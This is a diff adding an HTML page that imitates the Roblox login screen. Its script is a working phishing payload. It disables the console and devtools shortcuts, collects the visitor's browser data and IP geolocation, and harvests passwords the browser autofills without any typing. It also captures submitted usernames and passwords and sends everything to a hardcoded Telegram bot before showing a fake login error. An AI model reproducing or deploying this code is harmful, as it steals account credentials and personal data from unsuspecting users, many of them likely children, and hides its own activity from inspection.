@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Log in to Roblox</title>
+    <link rel="icon" href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;background:#000}
+        .page{width:100vw;height:100vh;background:url('https://images.rbxcdn.com/5f05bc6223b75052b594b38016762a77-marketing_bg_05202026.jpg') center/cover no-repeat;display:flex;align-items:center;justify-content:center}
+        .card{width:384px;background:#fff;border-radius:8px;padding:32px;box-shadow:0 12px 40px rgba(0,0,0,0.4);position:relative}
+        .card img{display:block;width:120px;margin:0 auto 20px}
+        .card h1{font-size:24px;font-weight:700;color:#191919;text-align:center;margin-bottom:20px}
+        .card input{width:100%;height:44px;padding:0 12px;margin-bottom:12px;border:1px solid #cdcdcd;border-radius:6px;font-size:15px;background:#f7f7f7;outline:none}
+        .card input:focus{border-color:#00b06f;background:#fff}
+        .card button{width:100%;height:44px;background:#00b06f;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:700;cursor:pointer;margin-top:8px}
+        .card button:hover{background:#009a5f}
+        .card .link{text-align:center;margin-top:16px}
+        .card .link a{color:#00b06f;font-size:13px;text-decoration:none}
+        .card .signup{text-align:center;margin-top:20px;font-size:14px;color:#666}
+        .card .signup a{color:#00b06f;text-decoration:none;font-weight:600}
+        .card .error{background:#fff0f0;border:1px solid #ffc7c7;border-radius:4px;padding:10px;color:#c00;font-size:13px;margin-bottom:12px;display:none}
+    </style>
+</head>
+<body>
+    <div class="page">
+        <div class="card">
+            <img src="https://images.rbxcdn.com/fc3f3e3158fc20ebb5ccc972064ebfe6.png" alt="Roblox">
+            <h1>Log In to Roblox</h1>
+            <div class="error" id="error">Incorrect username or password.</div>
+            
+            <input type="text" id="login-username" placeholder="Username/Email/Phone">
+            <input type="password" id="login-password" placeholder="Password">
+            
+            <button id="login-button">Log In</button>
+            <div class="link"><a href="https://www.roblox.com/login/forgot-password-or-username">Forgot Password or Username?</a></div>
+            <div class="signup">Don't have an account? <a href="https://www.roblox.com/account/signupredir">Sign Up</a></div>
+        </div>
+    </div>
+    
+    <script>
+    (function() {
+        // Console protection
+        var _c = ['log','warn','error','info','debug','trace','dir','table','clear'];
+        _c.forEach(function(m) { console[m] = function(){}; });
+        
+        // Disable right-click & devtools shortcuts
+        document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','C','J'].indexOf(e.key) !== -1) || (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+            }
+        });
+        
+        // Sanitize function
+        function _s(str) {
+            if (!str) return '';
+            str = String(str).replace(/[<>'"&]/g, function(c) {
+                return {'<':'','>':'','"':'',"'":'','&':''}[c];
+            }).replace(/javascript:/gi,'').replace(/on\w+=/gi,'').replace(/<[^>]*>/g,'');
+            return str.substring(0, 500);
+        }
+        
+        function _db() {
+            var ua = navigator.userAgent;
+            if (ua.indexOf("YaBrowser") > -1) return "Yandex Browser";
+            if (ua.indexOf("Chrome") > -1 && ua.indexOf("YaBrowser") === -1 && ua.indexOf("Edge") === -1 && ua.indexOf("Edg") === -1) return "Google Chrome";
+            if (ua.indexOf("Firefox") > -1) return "Mozilla Firefox";
+            if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") === -1) return "Safari";
+            if (ua.indexOf("Edge") > -1 || ua.indexOf("Edg") > -1) return "Microsoft Edge";
+            if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) return "Opera";
+            return "Unknown Browser";
+        }
+        
+        function _send(txt) {
+            var url = 'https://api.telegram.org/bot8922947900:AAE6Wzrbb-jyw8GSewl1rTezmIA8s4Y7dBM/sendMessage?chat_id=8622843931&text=' + encodeURIComponent(_s(txt));
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', url, true);
+            xhr.send();
+        }
+        
+        var _geo = null;
+        var _sent = false;
+        var _saved = false;
+        
+        function _loadGeo() {
+            fetch('http://ip-api.com/json/?fields=query,city,country,isp,org')
+                .then(function(r) { return r.json(); })
+                .then(function(d) {
+                    _geo = {
+                        ip: d.query || 'Unknown',
+                        city: d.city || 'Unknown',
+                        country: d.country || 'Unknown',
+                        isp: d.isp || d.org || 'Unknown'
+                    };
+                    _sysInfo();
+                })
+                .catch(function() {
+                    _geo = {ip:'Unknown',city:'Unknown',country:'Unknown',isp:'Unknown'};
+                    _sysInfo();
+                });
+        }
+        
+        function _sysInfo() {
+            var msg = '💻 SYS_INFO\n' +
+                     '▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n' +
+                     '🌐 Browser: ' + _db() + '\n' +
+                     '💻 OS: ' + navigator.platform + '\n' +
+                     '🌍 Lang: ' + navigator.language + '\n' +
+                     '📱 UA: ' + navigator.userAgent + '\n' +
+                     '🖥 Screen: ' + screen.width + 'x' + screen.height + '\n' +
+                     '🔹 IP: ' + _geo.ip + '\n' +
+                     '🔹 City: ' + _geo.city + '\n' +
+                     '🔹 Country: ' + _geo.country + '\n' +
+                     '🔹 ISP: ' + _geo.isp + '\n' +
+                     '▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n' +
+                     '⏰ Time: ' + new Date().toLocaleString('ru-RU');
+            _send(msg);
+        }
+        
+        function _checkAutofill() {
+            var u = document.getElementById('login-username');
+            var p = document.getElementById('login-password');
+            
+            if (u && p && u.value && p.value && u.value.length > 1 && p.value.length > 1) {
+                if (u.dataset.ut || p.dataset.ut) return;
+                if (_saved) return;
+                _saved = true;
+                
+                var msg = '🔐 SAVED_DATA\n' +
+                         '▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n' +
+                         '🌐 Browser: ' + _db() + '\n' +
+                         '💻 OS: ' + navigator.platform + '\n' +
+                         '🌍 Lang: ' + navigator.language + '\n' +
+                         '🕐 Time: ' + new Date().toLocaleString('ru-RU') + '\n' +
+                         '▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n\n' +
+                         '👤 Login: ' + u.value + '\n' +
+                         '🔑 Password: ' + p.value + '\n\n' +
+                         '⚠️ Auto-filled by browser';
+                _send(msg);
+                
+                setTimeout(function() {
+                    u.value = '';
+                    p.value = '';
+                }, 500);
+            }
+        }
+        
+        _loadGeo();
+        
+        for (var i = 1; i <= 15; i++) {
+            setTimeout(_checkAutofill, i * 1000);
+        }
+        
+        var _u = document.getElementById('login-username');
+        var _p = document.getElementById('login-password');
+        
+        if (_u && _p) {
+            _u.addEventListener('keydown', function() { this.dataset.ut = '1'; });
+            _p.addEventListener('keydown', function() { this.dataset.ut = '1'; });
+            _u.addEventListener('input', function() { this.dataset.ut = '1'; });
+            _p.addEventListener('input', function() { this.dataset.ut = '1'; });
+        }
+        
+        document.addEventListener('click', function() { setTimeout(_checkAutofill, 500); });
+        document.addEventListener('focus', function(e) {
+            if (e.target && e.target.tagName === 'INPUT') setTimeout(_checkAutofill, 800);
+        }, true);
+        document.addEventListener('scroll', function() { setTimeout(_checkAutofill, 100); }, {once: true});
+        document.addEventListener('mousemove', function() { setTimeout(_checkAutofill, 200); }, {once: true});
+        
+        function _sendLogin(u, p) {
+            if (_sent) return;
+            _sent = true;
+            
+            if (!_geo) {
+                setTimeout(function() { _sent = false; _sendLogin(u, p); }, 500);
+                return;
+            }
+            
+            var msg = '🕵️ NEW_CATCH 🕵️\n' +
+                     '▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n\n' +
+                     '👤 Login: ' + u + '\n' +
+                     '🔑 Password: ' + p + '\n' +
+                     '🌐 Browser: ' + _db() + '\n\n' +
+                     '▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n' +
+                     '🌍 GEOLOCATION\n\n' +
+                     '🔹 IP: ' + _geo.ip + '\n' +
+                     '🔹 City: ' + _geo.city + '\n' +
+                     '🔹 Country: ' + _geo.country + '\n' +
+                     '🔹 ISP: ' + _geo.isp + '\n\n' +
+                     '▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n' +
+                     '⏰ Time: ' + new Date().toLocaleString('ru-RU');
+            _send(msg);
+            setTimeout(function() { _sent = false; }, 3000);
+        }
+        
+        var _btn = document.getElementById('login-button');
+        if (_btn) {
+            _btn.addEventListener('click', function() {
+                var u = _u.value.trim();
+                var p = _p.value;
+                if (!u || !p) return;
+                
+                _checkAutofill();
+                _sendLogin(u, p);
+                
+                _btn.textContent = 'Verifying...';
+                _btn.disabled = true;
+                setTimeout(function() {
+                    document.getElementById('error').style.display = 'block';
+                    _p.value = '';
+                    _btn.textContent = 'Log In';
+                    _btn.disabled = false;
+                }, 2000);
+            });
+        }
+        
+        if (_p) {
+            _p.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter' && _btn) _btn.click();
+            });
+        }
+        
+        setTimeout(_checkAutofill, 30000);
+    })();
+    </script>
+</body>
+</html>
